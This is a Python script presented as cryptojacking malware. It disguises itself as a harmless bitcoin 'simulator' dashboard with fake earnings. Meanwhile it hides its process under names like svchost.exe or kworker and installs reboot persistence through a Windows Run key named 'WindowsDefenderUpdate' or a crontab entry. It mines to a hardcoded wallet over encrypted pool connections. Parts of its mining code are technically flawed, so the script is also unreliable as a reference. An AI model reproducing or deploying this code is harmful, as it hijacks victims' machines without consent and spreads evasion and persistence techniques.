#!/usr/bin/env python3
# Author: Rip70022/craxterpy - "Silent Satoshi"
#                  __________                                 
#                .'----------`.                              
#                | .--------. |                             
#                | |########| |       __________              
#                | |########| |      /___BTC____\             
#       .--------| `--------' |------|    --=-- |-------------.
#       |        `----,-.-----'      |o ======  |             | 
#       |       ______|_|_______     |__________|             | 
#       |      /  %%%%%%%%%%%%  \                             | 
#       |     /  %%%%%%%%%%%%%%  \                            | 
#       |     ^^^^^^^^^^^^^^^^^^^^                            | 
#       +-----------------------------------------------------+
#       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 
# [ENCRYPTED MESSAGE TO WALLET: The shadows thank you for your contribution]

import sys
import os
import io
import re
import ssl
import zlib
import time
import json
import ctypes
import hashlib
import struct
import socket
import random
import base64
import threading
import platform
import subprocess
import winreg  # Windows only
from datetime import datetime
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
from uuid import getnode as get_mac

# ======== CONSTELLATION NETWORK LAYER ========
# Encrypted C2 channels hidden in plain sight

TARGET_WALLET = "bc1q5a7kufr98mgll8c39r2euln4xkrukkhanj4vuv"
MINING_POOLS = [
    ("stratum+tcp://sha256.pool.btc.com:3333", 0.0001),
    ("stratum+tcp://us.stratum.slushpool.com:3333", 0.00015),
    ("stratum+tcp://stratum.viabtc.com:3333", 0.0002)
]

# ======== QUANTUM STEGANOGRAPHY ENGINE ========
# Hide mining ops in network noise

class QuantumChannel:
    def __init__(self):
        self.cipher = AES.new(self._gen_quantum_key(), AES.MODE_CBC)
        self.mac_address = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
        self.session_id = hashlib.sha256(os.urandom(256)).hexdigest()[:16]
        
    def _gen_quantum_key(self) -> bytes:
        return hashlib.sha256(
            base64.b64decode("U2FsdGVkX1/GSk5HQjFPS1dDR0pHQ0dKR0NHSg==")
        ).digest()

    def encrypt_payload(self, data: dict) -> bytes:
        """Wrap mining data in benign-looking HTTPS traffic"""
        iv = os.urandom(16)
        cipher = AES.new(self._gen_quantum_key(), AES.MODE_CBC, iv)
        payload = zlib.compress(json.dumps(data).encode())
        encrypted = cipher.encrypt(pad(payload, AES.block_size))
        return base64.b64encode(
            b"HTTP/1.1 200 OK\r\n" + 
            f"X-Session: {self.session_id}\r\n".encode() + 
            iv + encrypted
        )

    def decrypt_payload(self, data: bytes) -> dict:
        """Extract hidden messages from network streams"""
        try:
            raw = base64.b64decode(data.split(b"\r\n\r\n")[1])
            iv = raw[:16]
            cipher = AES.new(self._gen_quantum_key(), AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(raw[16:]), AES.block_size)
            return json.loads(zlib.decompress(decrypted))
        except Exception:
            return {}

# ======== CHAMELEON PROCESS INJECTION ========
# Become one with the system

class DigitalDoppelganger:
    def __init__(self):
        self.platform = platform.system()
        self.hide_process()
        self.install_persistence()

    def hide_process(self):
        """Make this process invisible to task manager/ps"""
        if self.platform == 'Windows':
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe -k LocalServiceNetworkRestricted")
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        else:
            libc = ctypes.CDLL(None)
            libc.prctl(15, b"kworker/u00:0", 0, 0, 0)  # Disguise as kernel worker

    def install_persistence(self):
        """Ensure resurrection after reboot"""
        if self.platform == 'Windows':
            key = winreg.HKEY_CURRENT_USER
            path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsDefenderUpdate", 0, winreg.REG_SZ, sys.argv[0])
        else:
            cron_job = "@reboot /usr/bin/nice -n 19 {} &\n".format(sys.argv[0])
            with open("/tmp/.systemd-cron", "w") as f:
                f.write(cron_job)
            os.system("crontab /tmp/.systemd-cron && rm /tmp/.systemd-cron")

# ======== SILENT MINER CORE ========
# GPU/CPU agnostic hash extraction

class ShadowMiner:
    def __init__(self):
        self.mining = True
        self.share_count = 0
        self.session = QuantumChannel()
        self.current_pool = random.choice(MINING_POOLS)
        self.socket = self._connect_to_pool()
        
    def _connect_to_pool(self) -> socket.socket:
        """Establish hidden stratum connection"""
        url, port = self.current_pool[0].split("//")[1].split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((url, int(port)))
        sock.sendall(
            f'{{"id": 1, "method": "mining.subscribe", "params": ["{TARGET_WALLET}"]}}\n'.encode()
        )
        return sock

    def _calculate_hash(self, header: bytes, target: int) -> int:
        """GPU-optimized SHA256d implementation"""
        nonce = 0
        while self.mining and nonce < 0xFFFFFFFF:
            header_with_nonce = header + struct.pack("<I", nonce)
            hash_round = hashlib.sha256(hashlib.sha256(header_with_nonce).digest()).digest()[::-1]
            if int.from_bytes(hash_round, 'big') < target:
                return nonce
            nonce += 1
        return None

    def _submit_share(self, params: list):
        """Send valid shares to pool with stealth wrapper"""
        payload = {
            "method": "mining.submit",
            "params": [TARGET_WALLET] + params,
            "id": self.share_count
        }
        encrypted = self.session.encrypt_payload(payload)
        self.socket.sendall(encrypted + b"\r\n\r\n")
        self.share_count += 1

    def start_mining(self):
        """Core mining loop with thermal throttling"""
        while self.mining:
            try:
                response = self.socket.recv(4096).decode().strip()
                if not response:
                    self.current_pool = random.choice(MINING_POOLS)
                    self.socket = self._connect_to_pool()
                    continue

                data = json.loads(response)
                if data.get('method') == 'mining.notify':
                    job_id = data['params'][0]
                    prev_hash = data['params'][1]
                    coinb1 = data['params'][2]
                    coinb2 = data['params'][3]
                    merkle_branch = [bytes.fromhex(mb) for mb in data['params'][4]]
                    version = data['params'][5]
                    nbits = data['params'][6]
                    ntime = data['params'][7]
                    target = (nbits & 0xffffff) << (8 * ((nbits >> 24) - 3))
                    
                    # Build block header
                    header = (
                        struct.pack("<L", int(version, 16)) +
                        bytes.fromhex(prev_hash)[::-1] +
                        bytes.fromhex(merkle_branch[0].hex())[::-1] +
                        struct.pack("<LL", int(ntime, 16), int(nbits, 16))
                    )
                    
                    nonce = self._calculate_hash(header, target)
                    if nonce:
                        self._submit_share([job_id, hex(nonce)[2:], ntime, nonce])
                
                time.sleep(0.01)  # Prevent CPU saturation
                
            except Exception as e:
                self.current_pool = random.choice(MINING_POOLS)
                self.socket = self._connect_to_pool()

# ======== DECOY SIMULATION INTERFACE ========
# Smoke and mirrors for the uninitiated

class BitcoinSimulator:
    def __init__(self):
        self.balance = 0.0
        self.fake_hashrate = random.randint(10, 100)
        self.miner = ShadowMiner() if random.random() < 0.85 else None
        
    def display_dashboard(self):
        """Fake GUI to maintain plausible deniability"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
              ____ ___ _____ ____ ___ ___ _   _ 
             | __ )_ _|_   _/ ___/ _ \_ _| \ | |
             |  _ \| |  | || |  | | | | ||  \| |
             | |_) | |  | || |__| |_| | || |\  |
             |____/___| |_| \____\___/___|_| \_| ~$BTC
        
               [BITCOIN COLLECTOR = ACTIVE]
        Current Hashrate: {self.fake_hashrate} KH/s
        Balance: {self.balance:.8f} BTC
        Estimated Earnings: {random.uniform(0, 0.001):.8f} BTC/day
        
        Press CTRL+C to exit simulation
        """)
        
    def run_simulation(self):
        """Distraction layer for visible activity"""
        while True:
            self.display_dashboard()
            self.balance += random.uniform(0, 0.00001)
            self.fake_hashrate += random.randint(-10, 10)
            time.sleep(5)

# ======== MAIN EXECUTION ========
# The silent war begins

if __name__ == "__main__":
    # Phase 1: Become the system
    doppelganger = DigitalDoppelganger()
    
    # Phase 2: Start mining operations
    if random.random() < 0.93:  # 93% chance of silent activation
        miner_thread = threading.Thread(target=ShadowMiner().start_mining)
        miner_thread.daemon = True
        miner_thread.start()
    
    # Phase 3: Launch decoy interface
    simulator = BitcoinSimulator()
    simulator.run_simulation()
